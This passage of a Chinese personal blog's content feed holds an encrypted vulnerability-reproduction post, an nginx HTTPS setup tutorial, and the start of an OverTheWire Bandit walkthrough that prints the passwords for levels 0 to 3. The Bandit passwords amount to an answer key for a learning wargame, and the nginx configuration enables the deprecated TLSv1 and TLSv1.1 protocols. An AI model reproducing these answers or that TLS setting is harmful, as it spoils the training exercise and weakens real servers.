9758fd20f30bae67edf5f81b57f04b576cc463564b71dc2551ba4fa3ffd64d02e5df54810855269b76bebbf0906020198eb2f797ac17c19c3b66e42eb59a0ccd0712b3239ff8d31ba8036be61d9c22ad4c0db051fa8fa65f079d7f048a4e33c6e22919da2617140af101a0641fba6f793063cf30c232ea6a15254636f722fc9b2e92233a96f607a1fee1b0f3e214727f92c261511a20fd4c434562e6b12bbfce6cf698a74de9055ad42147d86f86a841445b5c545113a7174081057f02e1e6a91b2bb5545204b9386bc5b43a5546714fc50ff266eb04b1c433f71f398a8dfcbc6b5d7fa099f8c68fb6ab477edd2bb028230a2a916f5b824b493259980acc6ae85b5fe3f1067cbb907caceef27502afba77b2b906769d4ebcb23d8f41d30f6dd73d208e111152448ef1978d3b3dfb5483671091c5129116d34c163de09f1711136d18d800b655af0893cdc28d742f57316d118f7c51413faaa0f21446aa91f3ba126dbd5991530b9e937c4f27b78c0a4bae60f8eb4f34eb482e96329bdba16b32e5f47d960c5b560739f021cb2a7eed1a970fb56919fc24ce68a0ea94b38b3ab54e14f1bae0d5f58a3440d6e8398a1f1a063b4c40828cde81f5bcd4f41c7bf13f38a383b9c5fa6e79754ab996bbea7edb3879ed61cd731ad3922b8276c19417cbdf7668697673a83a33c0b75ac0f064176ba1931b90d974873e56800704f770da01d86d30ea2d3f800e6884734a88c0c206b173aaa9270248babd6d85ee6a3cd5fd0bc7bd4d4c8042efe3ac989d78003a99805d0b4ff4f523e89f299ff231692440602450722d1b4914a08ff8b24d286bab51f3644627133cbf917789a99620eef4ef2f69400a59ad02d10a6dd5c1bd270249267e9763e6c2b809abef5acbe0e110ad0470b1389235cdeb0bc200e1a107265c0025cccd319f2e1d78b60efeb2ad2ccfb1e476893d88016bf991158e94e475ba3ae9d30e37b8be4f9bfff02fcc970b80a2b79ae2b84af42a635c89d6d7faf1c1165597b4a3386864baa39c48f5db3af2862b19afc27b608f8669a395f147684bbb14f320566c235f884bb3a298af957655b144c121770b13fcc8e650b71201958108906dd0a43eea531cf924e2a91965fec028d8cd7dd00de905b9f0eb2aa30e8b1e1e7618e203f01851696793bf2778b7f5c53af6c3198af86ee4c2e8657e524b6fbed373a61f017cd9d328bee27f426122ba1be19ead3c3f95ad14d7fd7534828aef0ff75c7e4c339de8e0cc9028a50593b478d9ab940e8e07a254eef67fda1df0ba2ab7bdf031734f1d37b8647a300ce3272998611b3451846484c00b80170ad33fc633135e3b0476da9e54f23f15945e8cddb5f6d769464d79acc76ec86128d011d65d3cfae75b0935995f93d397c0aecbed8e93446f5994ea3dbe53006b9802423c5a0d191123c8cfcf6266c15efdda34d69886e735fcbd6fb2864d500aad7627cd9ebb12835eb8dfa9fed2ef62dfca13e04264d8909c6ccd24788fc18d5c3d433be93af12d8a02dfc09b9ad4b2de972ed389f6718a8c0d5567bdb2d2100af7979df8bfd900355ad7e9b440bba69c9aab9519ad378e63da3db6a50a100d70759dd39fb1b0ee5e5b5d2f9096f54a1cc182789ded66eeb2706438ca92711447a8faca4e8228f3d984f65f51e7d378199c74e94d41ad7e3b947c8657fa6e075dcba47a931ea8e117ca619ccbd7173e243b4163ddd89a94c9f774b3ee402bf8fff9a8c5b877143138ade6711d423dbd54b0ec5ba2fc1eaccd6dcd6372c9a3b192ef24f723a7086b042981b5cb51b3252bebc8e0ed6c5149b9f23f90198378676897eae1eef402a7b1c6b557c54396e333ddc74e3f33c08eaecdd3262a788196aad8348450474ec7327b6710f531cab821984a17348e9894512085b046dbc4b0d99d22e644232ed06bba7ce0cd870d19b543b4bf6cfc84cfeada3ba856693ac6b5757e5883bb681b6e5aaab525924864f626091c5a4280e8a80fda1f4be3c8cf07d633c8c09fd42cdd969ba35ab2504d538c812e93ff5b6e26b70ee772732c537efd7f2c4421e43c9991961ae1aa6b9043cbe0595640cb8f9e238a2aaec481d1d31cc3b81c4bcfeb7b46dd25359860573075f7595bb7177b754d8a5199174915f8a3b42c68bfb81ff46b6c135647ce7bb678457e048c554df74544ff926815ac56a308c41bb68855089d60aabd1fa3ce9a4f4808be08cf6169edbe6cd96c5a2b155eef6dc3380289d0ddfbf9fff9487a783a36928cc534e97ecf64a70328f04327bbbfb15e80622d316bf35bf0ee03d46edb028f67b1cb69bd6bd8f622fffce5d3637fd99265cb5ceab46f3e59691c77d8abd62fba9e0aa617b48236788c43d9abe046a4b9dbac38d02db7874483c90d6bd8d348773a00b037d102dcdb3c8e14784d7196f355466d996f226f8c48484282544186d177b949afb57f945b8f5d4abbe90553ea3f3dcc1507170f577f1f3c930ca530cb79744e2a9b203f7caf83368ee6651f07a83a2cf9f53026cb1c3dbd0d82c4a529674ada985cd70a970ab20c4fffc5ac43c68684f8b0b3a60acb6fd60cd51b950f472d5a44943a360e9dd62eee22020d15e13cf6d7e062a9ed519493afbad630a9308a679c162b8d645914d48fe288243ac5f88ade211d07332660b02cbaa2663ebabb9e2f079c02d88c9fc28b91a5184844f14e04364f02fc288d9eb327e75078088b6ee5eb2905d37b2b07cd64065e8d863d40418ba8ab9312027158dce277fa5009dd2f816b417899cf6fa59cc74b19855cf160bec8f669d0b7a6103ef7b298692d9628969cf385e3bd3f347e494b474b81e8b16693039363b005c6f5f5f847d729525ea3a9b3649a30a8e24634c494d60d3e48e2c579d3dcbfa4b2efde31d92658f65e8563c751a505bcab17bdee500bf5c2efbaee26daf1a9af2596d726befaad4635391f55262a8ae72b82da970f597293bdd0aceeb60ad4a91ba8c772deb84a1969a9440ebf032d87fb62a4e8b32ccc8a3e77cdf808e0294fe3f6bf678d2e3d5241925db3f7e15aea9e6790b1f1b559d52091ff769907e6ae4aa62bedc58c8e88555fdf4e9f0f36a8e43b10fc39a053992a2b9296da0f862f9969fc9cf313f74a49282115acb45438e6fdc598b3dbf96cdb27bc9b7579cb6ed8a59a8f9d14825dc0bd0cd098224fdcb7a44c95702516b8ed82a0e1d144b09de82b9b3f236b37c480a905f2b836a45d4f11c1420465c94052af52582b7711f5be15efd9d3ba675008457f392e03270c4046e2f8512299dc0d2a4710a92b1f17c28f8975393004266b0815a1eee943a7b282d37c020d73dd887082b1f693166d333455f95f004584799ee087d5e30b92e40c515d16bbe435c4378984774482bef33b08c54e3c0c1d642fa682c7a463ececc660ad13094d5469b74a160608b77f059f2b409db7d9d855081b1cbc955e608748c35d8a2765e4f130dfa0af00672ae551c06fb7caf550c1a9948b9dd7a4677d29647889757873964502891bf44657b60118d9626b88f589e88e979198245858be645bd132e63cb6d3e95e376a92e72d67b5177a449a2eecb123def9f15f9a7856a54b3186b6b885e903c98bab51042c98771bd1a55cfa2a5f81aa097e76414641b511abf17cea0961f4f175064516d17b898e5340a0597681b51bf87863daa3d4dfd05b61c5fd9b8007b570d472176a8c0a663c479a14edb6c78ff9b4240f1d7b38a6ce559c0b45df3ab905d066c8d28e74e2e0f4081a3e42a2c67d54137f6984163aa2284bf92b6ca9e7090c009b2f81e5dd1e82430884d8b79f69996012f4a6cbe2edcaaebdb16423253fe31c3f9f0b5dc116ddc73e6e539d8032bddc22d267eb19bdeafee9dd277779a0c4a922a4db9feee0ddf8e3085bb4f6011a6ab56ba54ca03b2d007f0397e0b8d859637a2b8b903f010ddaaf7c329dd4465e0d7f9e7d0450cdc6351f0c5a3b0491dbd297995490afc9c7e9728a4d66d9c1fd6b53717e6f5a0c64f8d2451105b921c73ce15afeaec60e51aa337a3c330520c91ac0ebe70bd193f3b1ce788f9eaf5caf3ca3016d6e73ba36dc8f8b3fa35cfb8cad5a90a3af0e43b3cbfd95dc14291a20eeefc45c08bed0f94c83b24ddf654399c28c2d6ecf4a9469e20dc539b150e0ce8b45cd9af2bc24054150a5204d1589685ba62c8cf028d3b65d1cc5de983de99665f46aeeb4af5e0488efba16c6c92722793af27f3f4a8934e0649953e50eb099dad24949afb28aefd5965049258a22e0fc447029c8abcb10b8cd32eaa8cdbf93ee1b81a7336ee8855e67b19e3a69af276009b3e958840589bbf48941e8b060f541dd213f30cfdc3c7b9e943a9f7c812d6631e6fea920ee9771637e4f8b77194c63b9a3da6da978bad684d45e11583ce5b16e56856928c8d32b42df16f1912dfcaf7bbd12698df1233dcefbbd8bb1ef4e743b0f7798d27971bb04cd77f3f66c280151d66ec1e4e9e8942a57cdbebfcb0bfb684b91785a3c68625383bd5b68d2113618933ec02fc9032f3d930402ef55ebe5233bc82abf573e6061c562ef43dac3e58f8521a2db38de99f23dfb4bca7780c6a68bb1d75e338c1f0beec2b443caeaa72cb006865e8d3de5a621ed66762da1f68b64ba0946aa344d66593e6aad1917793a20569b708a2fc7fe56a21ace49ec451012e67aa6885d7af49aeb894dcaf72ff9f3a2301606f264fb62ccad96e47d0d6810cc1dc1f31091c3b9dff600bc45b0358ff2185b7f2079ccccab5bc38a7d45f466091819af44472434c052a9eba9e36491dda370b3fdaac9c6a05055aad134deda77e9f23be2ad6fc6b8c47f123c4515cb0886c46ff92bbd99baabe4cfc255f73528d92c0d54db1de43a0b5c5264fd151ddaa140aca30d35adb489cbaee409ee587270ae1da5b721c3153ff4d73c1de75b976529e980fff8d20964117e211a4f7b7895965d715ce85e7bd2704890d2486bf75aca6989c14655fb3888178ac20006e6b4c46cd96e10ffe4bddc2d29e99e0b11524e4e8d5323fc15ffd9b6fb5a34a3bbbba50c186868ed2fff5fe27d13e85be1acbb740ecb7bc6dad589353587463bd92eb121ef5062ad7a549835d6ae580c00336ddf649e7650394ae853b570ed066ddb9f0496a803e42a501887960b7a5b9b9a3cb9d614de662b486175ef6889dd89cd47e718f6cc72ceead6d05a52b2a82fe594d6bfe7c03efe4d37c3ef6b4b12a4b8f808529df91bd331b029b23041eb831659c627e919c95c905ad72438c6dd7e319a8bed9a9f35b31ed0c93aacd07a5ac5c2961c68d6195427d2c3caab3ae55ac04bca4ec0f6503aa68170a29539e03bbe14eecc249455b492e31621231b6decff454f09e17910c25edec364e4ee996184e9ca2f49b9cf5ef32fb9f3ad4d524388009e39e28824688e35c169aa53005b0b0ec6c8068c5e53ae047e8fcaf732e2105cade236ee0cca6ac08346b649eb1f9fe218023b28a9ed3b03da73359795994334eeaf70aa8af2b9a6de8d7a590e56c27dec262dc288f7eb36b41a0bcf46fc901fec8d6edc26616f4785cf3e133336d04d875a21216f44305dc33ff5e81b2526442f3b61dae47237d9a9bbe17d530edeb50e00c3c212eb255fe1ae3f5b060d91e4ae947f6a6069fc690fc3f15081348dddca9f284c7fba9a7508dc82dbcd5d4c9141d4cb20439a9217c3d842aa5b74cf1c888150d1234d7e9565875fdf459d020db8284459a976bb479f71c323ea54a819b8c993b8ed8ad6a86eb1fbac72d166ab1d6c8e67f2e57c4f6d758a81b54c04d94e04aa0243689ecb74a584e9cfec23f118444047af5098bf9791c3e5f96b5fefe49de39e925901484d62739750c946f7a31000d3c657e8ba7349e2e44dccaa8af94da3fc7226a987638a499c4b3408b8e4247084290adcea0fd606e0e2f7fab4951aa529427501ce3033c4cb0cdd294cfeb9ce532a57010270ae5f53a7bb8298e5980373de739f050eafaba1ecde49c3f3afc6eed3d983323916bcad07e09510d332dca2a6f3302ee5accc90d1188cddad1d09f54548228d91600668a214c9b873ceb53c347c73a4367c3a95ec67a138c9cb3d349d303dc3404391a5494af2c6f94321b6bcbb368d0debfaa6258edfc334a6a09b1015fb5743d8945104a9bcbb2eb1022c06878f9c920429a85488ca4e7d54c14f9cac50d90b3be54f18b0c3b782f66c72723613a937320b440d7f6966f1a567009677ac4d224e067ac024d6fb13134e0f709c387d3c700121dbae071b23fe404f00f91ce734c3fa5b78e61ff47cb23a86e0014d6b1097865528b26053177e7ece7471e1e4cf16becec2ca942089b89748fb1283f9463bc7ed6d8ab9f632ecffe79306b73b568506dc8dc6650d71887f61c6cf988e94e0cae1f0567dee964ef425d6645704c02481d6f3c0c68a8ad792cae938cf42309912e6b47573ead09737c02b662ae3886556c1f83cbcb4d20a59aaf34c7b09bc0cee3b57b448fd4af431f0515f1c9794a4cdcbd8ff31df72b8b448d668690b3353d97086e7642e918bb76e864ce02d6bde09a4ab2c33ddacdf4300324ac21b807bd3ea3aa28f01a27fc167beb97db3dc9cb0099c6f63f99b11d2776d7d3c0925d64de8492d5b754fb02d0650792a9328d9f729415d887c31bb1571b63e693f1c96f372fd907672321c3275610702a6924803ac9f160094eacb171137f95aca919204881c3a02551c5f6811d8e5b4f18e6ee8a63ee92f2791458e75cb7439628dcb7213441b8a6c18b6eeb6c6e7002481761adbf254482ac4a012aa821b53aa77e40a31e0dc67c7d2979e99514075786591fea6778d2719e7a09e11269146e646fd3f4e577cef4cbbf7a3527b62a86799eadec66aa73a0301c668352c8e34de9647310d89df3c21d51b1ce49ecd2ac9fe00370e54ac98f5b3cc8eaef3c85ecbff54786f17f82d64b02fec2a37b69a3dfa5e31a667dcf2477841b2d68c770ecbfd7d861d0a57835e22da4d313f10ffeb984bb406d8e4922fc7d0c05110671b55e23d76b3728ebd5729e4aa674208fab009c3209ab3b8e06cfb62e718c976de3d2ceb2cd6b763655a1011d72e839132a44926ba5b75c9b9c083b510e189f48815e48904b3ccc02350e884273f696c718c7e593f759591ff777aef87600dc2df1a4bfe3b8ef76412b2feb1d40b5b54f01a6f2d6a3ea4327bbfd4a40c345177af31a2b994ba2828e190fd53bae699176e98cf44655923d2ebf4cb955687603e7562663c7bd9c8d438d830dd09e21276e074a434a8e22ff8ae213067d02de2b3ca988d3022fa884717a2b097464701df1e28ae2db10ae591777e8c140dc81730cc65ea75cc5c0583191fb9d5a6e040dcf6e07f164fdc79d4835f1aeda4da19c76e36a9e7b15f62a5f3d5a1182bcb444ccb94afededc76f573b497b45b7e1a43188e2442db89d869f0e14fe7739d9a9dde63e881e320bf52a981341fb618217c9141c2ab39140db5faa10904c280e991b34b628a0a6610911935781897201f4167a8e768cd14ea0cf7a01484bbc9aa6e4401cb583b250eac9c5ae62829f9f7ceb67ea876aa611e26578c07fe03d536e422adaf74ca1de8588d108f192a2871db25c1851c620bf52777b188c7031a61029d09fa460db34ad94caeff172926855e8a7ac3535a9a5e3fc6202aed4647a3150fedd0b778dfeb575841b7e6b48bfc24ab2998b64ebb02dcffa4857c8e26ac0ceb04fe547a5cf9835b72d637b7a97b3faca810421f1333636b7986e0d77e56afeba3cc72414658864c3e15da77edcace577dece9409c1f2ae31f54a39fbfaf9b21b0694037491bb869e324274c9bfac9abbedc6dc3e632dd40ac838885f59b20189906ad3157fecdf6052358f22694d57963b18263b82d5ee7996d2707346d74dcda846e6d40364e10a0b8837a293866b980d9a09786b3431ad19e0d4040e96ab552556f5e488805d108827395299783d38634f7e14f8dddb2596233d63aa8f51fb5adfcf68346ee8271efa7401111e9486d493ba6907dbf3c52197d92063b83ba28530d4653c10599874f436865dfabf5b41a97d66d9722fe5fd1d75f92555b229216f2af3bb2dbb0db1d2b5ece8ceaed789393835d838311e2212b3595b9cd64198716b941bdf4f32bac1b70d75cd35313cbe1a860062cbd601498ad968347387c22329e301aac9532d5adcf318424c20dc857b6c0752a01f4cbdefb7ab290b954911d1a051cd6accdae0d2b684a71daa9a83a77750188888a5ff077c65a14340bfea04f13c4636ae2121c311faaf35138c23d4e959a5801c0b187b3e4b74b075df520da534de1b4a84e39e6ddfd21161d1fd2f89ec4221d03629e25ea36842ee3cada50a4360cb09138afdc4cd451b617fe9134b8c6ef02e6eee80924d609ac3059f1a1dc2e66d9a0f46a2265071b050d9db2689076f008237a0d633a0722d6ca6c067a49a706019cbc79cb404ad260954518cdc30f47725b478b8dee1ca253c0d0336b9afdcdbfea3c64007e1fb9f5acafee9792e739b15ed25b10f103b6e638d61dcb98267ee806118b90e4f6f4b2c740ccc4d965e4c4a092acb86c09efd5d5bdf4d24e78996f054d1aeb51ddfe56fa134da7d0d77d73688d12742edff3dba7e27834df176243b87e4e33c5c6baf40d716a07247850e00320986e2e04cd4afa827ef60eb20336c6adeacd41e4f72aa05ee6864d54aa52da7fa97a6ca194c7df53492a3bcf3259a2059ffb00d1280036e38c7345df3b2adc3285dd9ad2152ffd7e9d9319e52bd5426e915b9974bd93a2f3f7ab98ca6b8e4e0a22f45be726e53c9b95576696e6f731c8115b890d152272ab08f459edd36e996f8ace562881b98c4d49edef6959b54d87c0f4e4fdf2db0ea40dd208ea2a22cb04a1abca26135055afec0c5d64c03a6b3b96ce075b765822cf2a435d074892abd387d1852f77ed9f124933eadb1343067818e82c63b6e7d0d3230d93aa9db42c107b3185957d33e61a2fce6dfd702a0fcbde406eb6b3a816f22026be127c66f2863b51fbd13ea285d8efbb028dd664bd13d85fa7cce8b9639005e97c300da4a70ef8da37b8f53297dcb2f4a3311dc54d6c892e0ce427ff430b0efb319717c10ad7a17cce58cb13d2102ce4d7a7e9147aebb020c5caad261fcfd12c5d00c3375169e26e6ee47a4e44bb073b6eb176673041df8bf70747adab396c3c9b6cab5d4390d011107eef931fbaa4dca68d4f1c14221afbf33503edd50c325bad82dab473050c9c9b187c13b37e67a8c9885b8155327b72acfbb77f4b313f2093d5e36667c24864239663c07becad938ff09574f31ee2321a904d317f6096e13562d3368405ac2d0e666c15595fa2403e71f50bcefad284e47f91ac7a86f10217a8a</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
  </entry>
  <entry>
    <title>nginx配置ssl证书</title>
    <url>/2021/08/27/nginx%E9%85%8D%E7%BD%AEssl%E8%AF%81%E4%B9%A6/</url>
    <content><![CDATA[<p>本来想着将博客从github迁移到云服务器之后，访问速度能够快一点的，但是发现实际访问还是很慢。这是因为google浏览器会强制转换为https协议，意思就是说需要配置ssl证书啦<a id="more"></a></p>
<h1 id="免费ssl证书获取"><a href="#免费ssl证书获取" class="headerlink" title="免费ssl证书获取"></a>免费ssl证书获取</h1><img src="http://img.npfs06.top/20210827212755.png" style="zoom:80%;">



<p>在这里可以获得免费的ssl证书，使用期限一年</p>
<img src="http://img.npfs06.top/20210827212816.png" style="zoom:80%;">



<p>点击【立即购买】即可免费获得20张证书</p>
<img src="http://img.npfs06.top/20210827213151.png" style="zoom:80%;">



<p>购买之后，点击【创建证书】，就会生成下面框中的内容</p>
<img src="http://img.npfs06.top/20210827213339.png" style="zoom:80%;">



<p>点击【证书申请】</p>
<img src="http://img.npfs06.top/20210827213457.png" style="zoom:80%;">



<p>点击【下一步】。这里会自动添加DNS解析，我们直接点【验证】，提交即可</p>
<img src="http://img.npfs06.top/20210827213527.png" style="zoom:80%;">



<p>过了一会就会发现申请通过，就像这样</p>
<img src="http://img.npfs06.top/20210827213652.png" style="zoom:80%;">



<p>我们点击下载，选择nginx</p>
<img src="http://img.npfs06.top/20210827213726.png" style="zoom:80%;">







<h1 id="Nginx上的配置"><a href="#Nginx上的配置" class="headerlink" title="Nginx上的配置"></a>Nginx上的配置</h1><p>nginx的相关配置一般都在<code>/etc/nginx/</code>目录，因为nginx版本的不同，该目录中的内容一般都会不同，该目录在我机子上的内容如下所示：</p>
<img src="http://img.npfs06.top/20210827214319.png" style="zoom:80%;">

<p><code>nginx.conf</code>是最最最重要的配置文件，其中<code>nginx.conf</code>文件又会把<code>conf.d/</code>目录中<code>.conf</code>文件内容和<code>sites-enabled/</code>目录中的文件内容直接include进来，include语句主要是这几句：</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="regexp">/etc/</span>nginx<span class="regexp">/conf.d/</span>*.conf;</span><br><span class="line"><span class="keyword">include</span> <span class="regexp">/etc/</span>nginx<span class="regexp">/sites-enabled/</span>*;</span><br></pre></td></tr></table></figure>


<p>下面介绍一下我机子上<code>nginx.conf</code>文件的内容，主要是一些基础配置。我们可以看到最后两行include的内容，就是上面的内容。<strong>个人建议把一些站点的配置都放到<code>./sites-enabled/</code>或者<code>./conf.d</code>目录中，方便日后管理</strong>（增删只有删除相应文件即可）。</p>
<p>接下来开始正式配置。为了方便日后SSL证书的管理，我们在<code>etc/nginx</code>目录中创建一个<code>cert</code>目录，然后把下载下来的证书拷贝到<code>/etc/nginx/cert</code>目录中。为了方便，改了下证书名字</p>
<img src="http://img.npfs06.top/20210827213920.png" style="zoom:80%;">



<p>之后进入<code>./sites-enabled/</code>目录，创建一个文件为<code>www.npfs06.top</code>（取名为这个，是为了方便管理）</p>
<img src="http://img.npfs06.top/20210827214639.png" style="zoom:80%;">



<p>之后把下面的内容复制粘贴到 <code>www.npfs06.top</code>这个文件中</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">443</span> ssl;</span><br><span class="line">    <span class="comment">#配置HTTPS的默认访问端口为443。</span></span><br><span class="line">    <span class="comment">#如果未在此处配置HTTPS的默认访问端口，可能会造成Nginx无法启动。</span></span><br><span class="line">    <span class="comment">#如果您使用Nginx 1.15.0及以上版本，请使用listen 443 ssl代替listen 443和ssl on。</span></span><br><span class="line">    <span class="attribute">server_name</span> www.npfs06.top; <span class="comment">#需要将yourdomain.com替换成证书绑定的域名。</span></span><br><span class="line">    <span class="attribute">root</span> html;</span><br><span class="line">    <span class="attribute">index</span> index.html index.htm;</span><br><span class="line">    <span class="attribute">ssl_certificate</span> cert/www.npfs06.top.pem;  <span class="comment">#需要将cert-file-name.pem替换成已上传的证书文件的名称。</span></span><br><span class="line">    <span class="attribute">ssl_certificate_key</span> cert/www.npfs06.top.key; <span class="comment">#需要将cert-file-name.key替换成已上传的证书密钥文件的名称。</span></span><br><span class="line">    <span class="attribute">ssl_session_timeout</span> <span class="number">5m</span>;</span><br><span class="line">    <span class="attribute">ssl_ciphers</span> ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;</span><br><span class="line">    <span class="comment">#表示使用的加密套件的类型。</span></span><br><span class="line">    <span class="attribute">ssl_protocols</span> TLSv1 TLSv1.<span class="number">1</span> TLSv1.<span class="number">2</span>; <span class="comment">#表示使用的TLS协议的类型。</span></span><br><span class="line">    <span class="attribute">ssl_prefer_server_ciphers</span> <span class="literal">on</span>;</span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">root</span> /var/www/html/npfs06.github.io;  <span class="comment">#站点目录。</span></span><br><span class="line">        <span class="attribute">index</span> index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> www.npfs06.top;</span><br><span class="line">    <span class="attribute">rewrite</span><span class="regexp"> ^(.*)$</span> https://www.npfs06.top;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>同理配置<code>https://npfs06.top</code>,只需要在文件中增加一下内容</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">443</span> ssl;</span><br><span class="line">    <span class="comment">#配置HTTPS的默认访问端口为443。</span></span><br><span class="line">    <span class="comment">#如果未在此处配置HTTPS的默认访问端口，可能会造成Nginx无法启动。</span></span><br><span class="line">    <span class="comment">#如果您使用Nginx 1.15.0及以上版本，请使用listen 443 ssl代替listen 443和ssl on。</span></span><br><span class="line">    <span class="attribute">server_name</span> npfs06.top; <span class="comment">#需要将yourdomain.com替换成证书绑定的域名。</span></span><br><span class="line">    <span class="attribute">root</span> html;</span><br><span class="line">    <span class="attribute">index</span> index.html index.htm;</span><br><span class="line">    <span class="attribute">ssl_certificate</span> cert/www.npfs06.top.pem;  <span class="comment">#需要将cert-file-name.pem替换成已上传的证书文件的名称。</span></span><br><span class="line">    <span class="attribute">ssl_certificate_key</span> cert/www.npfs06.top.key; <span class="comment">#需要将cert-file-name.key替换成已上传的证书密钥文件的名称。</span></span><br><span class="line">    <span class="attribute">ssl_session_timeout</span> <span class="number">5m</span>;</span><br><span class="line">    <span class="attribute">ssl_ciphers</span> ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;</span><br><span class="line">    <span class="comment">#表示使用的加密套件的类型。</span></span><br><span class="line">    <span class="attribute">ssl_protocols</span> TLSv1 TLSv1.<span class="number">1</span> TLSv1.<span class="number">2</span>; <span class="comment">#表示使用的TLS协议的类型。</span></span><br><span class="line">    <span class="attribute">ssl_prefer_server_ciphers</span> <span class="literal">on</span>;</span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">root</span> /var/www/html/npfs06.github.io;  <span class="comment">#站点目录。</span></span><br><span class="line">        <span class="attribute">index</span> index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> npfs06.top;</span><br><span class="line">    <span class="attribute">rewrite</span><span class="regexp"> ^(.*)$</span> https://npfs06.top;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>




<p>需要注意一下几点：</p>
<ul>
<li><ul>
<li><code>server_name</code>需要配置为你自己的域名；</li>
<li><code>root /var/www/html/npfs06.github.io;</code> 这个是你网站的所在的目录；</li>
<li><code>ssl_certificate cert/www.npfs06.top.pem;</code>pem文件的路径；</li>
<li><code>ssl_certificate_key cert/www.npfs06.top.key;</code>ket文件的路径；</li>
</ul>
</li>
</ul>
<h2 id="http的重定向"><a href="#http的重定向" class="headerlink" title="http的重定向"></a>http的重定向</h2><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> npfs06.top;</span><br><span class="line">    <span class="attribute">rewrite</span><span class="regexp"> ^(.*)$</span> https://npfs06.top;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中的这样部分是为了在使用http访问站点时，能自动跳转到https访问</p>
<p>nginx配置文件配置完成之后需要重启nginx</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">service nginx restart</span></span><br></pre></td></tr></table></figure>




<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>在重启配置nginx的时候，可以会遇到报错，这是因为在某些细节山有错误，不如说忘记加分号</p>
<p>我们可以通过如下命令查看详细的报错信息</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nginx -t</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Others</category>
      </categories>
  </entry>
  <entry>
    <title>overthewire(bandit)</title>
    <url>/2020/05/13/overthewire-bandit/</url>
    <content><![CDATA[<p><a href="https://overthewire.org/wargames/">https://overthewire.org/wargames/</a></p>
<p>The wargames offered by the OverTheWire community can help you to learn and practice security concepts in the form of fun-filled games.<a id="more"></a></p>
<h3 id="level-0"><a href="#level-0" class="headerlink" title="level 0"></a>level 0</h3><p>xshell 连接</p>
<blockquote>
<p>主机 : bandit.labs.overthewire.org<br>Port: 2220</p>
</blockquote>
<h3 id="level-0-gt-level-1"><a href="#level-0-gt-level-1" class="headerlink" title="level 0 -&gt; level 1"></a>level 0 -&gt; level 1</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bandit0@bandit:~$ ls</span><br><span class="line">readme</span><br><span class="line">bandit0@bandit:~$ cat readme</span><br><span class="line">boJ9jbbUNNfktd78OOpsqOltutMc3MY1</span><br></pre></td></tr></table></figure>
<p>下一关用户名 bandit1 密码 boJ9jbbUNNfktd78OOpsqOltutMc3MY1</p>
<h3 id="level-1-gt-level-2"><a href="#level-1-gt-level-2" class="headerlink" title="level 1 -&gt; level 2"></a>level 1 -&gt; level 2</h3><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">bandit1<span class="variable">@bandit</span><span class="symbol">:~</span><span class="variable">$ </span>ls</span><br><span class="line">-</span><br><span class="line">bandit1<span class="variable">@bandit</span><span class="symbol">:~</span><span class="variable">$ </span>pwd</span><br><span class="line">/home/bandit1</span><br><span class="line">bandit1<span class="variable">@bandit</span><span class="symbol">:~</span><span class="variable">$ </span>cat /home/bandit1/- </span><br><span class="line">CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9</span><br></pre></td></tr></table></figure>
<blockquote>
<p>利用绝对路径进行读取</p>
</blockquote>
<h3 id="level-2-gt-level-3"><a href="#level-2-gt-level-3" class="headerlink" title="level 2 -&gt; level 3"></a>level 2 -&gt; level 3</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bandit2@bandit:~$ cat spaces\ <span class="keyword">in</span>\ this\ filename</span><br><span class="line">UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK</span><br></pre></td></tr></table></figure>
<blockquote>
<p> 利用<code>\</code>进行转义空格</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bandit2@bandit:~$ cat <span class="string">&quot;spaces in this filename&quot;</span></span><br><span class="line">UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK</span><br></pre></td></tr></table></figure>
<blockquote>
<p> 利用双引号进行读取</p>
</blockquote>
